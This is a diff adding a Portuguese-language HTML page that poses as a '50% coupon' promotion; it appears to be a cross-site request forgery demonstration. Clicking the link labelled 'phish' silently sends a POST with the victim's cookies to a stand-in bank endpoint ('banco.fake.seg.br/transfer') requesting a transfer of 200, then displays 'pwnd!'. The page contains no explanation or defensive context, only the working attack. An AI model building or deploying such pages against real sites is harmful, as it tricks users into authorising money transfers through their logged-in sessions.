@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Promoção imperdível</title>
+  <style>
+    body{font-family:sans-serif;background:#0d0f1b;color:#fff;
+         display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;}
+    a{color:#00c8ff;font-size:1.5rem;text-decoration:none;border-bottom:2px solid transparent;}
+    a:hover{border-color:#00c8ff;}
+    #msg{margin-top:2rem;font-size:2rem;color:#ff4081;display:none;}
+  </style>
+</head>
+<body>
+
+<a id="phish" href="#">Clique aqui para o cupom de 50 %</a>
+<div id="msg">pwnd!</div>
+
+<script>
+document.getElementById("phish").addEventListener("click", function (e) {
+  e.preventDefault();
+  fetch("https://banco.fake.seg.br/transfer", {
+      method: "POST",
+      credentials: "include",                         // envia cookies
+      headers: {"Content-Type":"application/x-www-form-urlencoded"},
+      body: "value=200"
+  }).finally(() => {
+      document.getElementById("msg").style.display = "block";
+  });
+});
+</script>
+
+
+</body>
+</html>
